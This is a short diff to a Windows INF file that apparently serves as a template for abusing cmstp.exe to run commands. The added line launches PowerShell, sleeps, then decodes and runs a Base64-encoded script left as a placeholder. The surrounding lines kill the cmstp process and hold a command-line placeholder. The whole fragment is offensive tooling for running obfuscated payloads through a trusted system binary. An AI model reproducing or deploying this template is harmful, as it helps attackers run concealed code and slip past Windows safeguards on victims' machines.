@@ -21,6 +21,7 @@ RunPreSetupCommands=RunPreSetupCommandsSection
 [RunPreSetupCommandsSection]
 REPLACE_COMMAND_LINE
 taskkill /F /IM cmstp.exe
+powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('B64ENCODEDPS1')))""
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
